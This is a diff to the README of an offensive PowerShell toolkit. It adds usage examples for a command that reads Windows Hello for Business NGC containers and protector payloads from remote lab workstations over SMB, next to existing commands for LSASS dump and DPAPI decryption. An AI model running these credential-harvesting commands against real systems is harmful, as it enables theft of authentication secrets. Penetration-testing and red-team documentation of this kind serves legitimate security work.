@@ -769,6 +769,24 @@ Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\
 Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp' -Cache
 ```
 
+#### Get-TBONGCInfo
+
+Parses Windows Hello for Business / NGC containers and metadata from:
+`C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc`.
+On a live system this is typically SYSTEM-only, but TBO can read it over SMB using backup semantics.
+
+```powershell
+# Enumerate NGC containers for all users that have Windows Hello configured.
+Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol
+
+# Include parsed protector/item details.
+Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol -IncludeProtectors -IncludeItems
+
+# Include protector 15.dat payloads (InputData) as hex (used by some offline decryption tooling).
+Get-TBONGCInfo -ServerName corp1-wks01.corp1.lab.home-labs.lol -IncludeProtectorData -IncludeProtectors |
+  Select-Object NgcGuid, UserSid, KeyStorageProviderGuid1, InputDataLength, KeyStorageProviderGuid2
+```
+
 #### Get-TBODpapiBlob
 
 Decrypts a DPAPI blob using a DPAPI master key.
